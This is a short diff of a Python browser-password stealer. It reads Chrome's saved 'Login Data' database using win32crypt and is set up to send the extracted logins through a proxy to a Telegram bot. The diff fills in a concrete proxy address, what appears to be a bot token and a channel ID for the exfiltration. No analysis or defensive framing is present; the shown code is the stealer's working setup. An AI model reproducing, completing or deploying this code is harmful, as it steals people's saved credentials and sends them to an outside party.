@@ -1,12 +1,12 @@
 import os, sqlite3, win32crypt, requests, shutil
 
 USE_PROXY   = True
-PROXY_IP    = ...
-PROXY_PORT  = ...
+PROXY_IP    = '90.189.116.152'
+PROXY_PORT  = '3128'
 
 URL         = 'https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s&parse_mode=html'
-TOKEN       = ...
-CHANNELID   = ...
+TOKEN       = '1094120669:AAFQEeTJ5xjPOlXPJ-wW0x3Xy4V_BRYd2u8'
+CHANNELID   = '-1001390801936'
 
 databasePath = os.environ['LOCALAPPDATA'] + '\\Google\\Chrome\\User Data\\Default\\Login Data'
 result = '=== Extracted from %s computer ===\n' % os.environ['USERNAME']
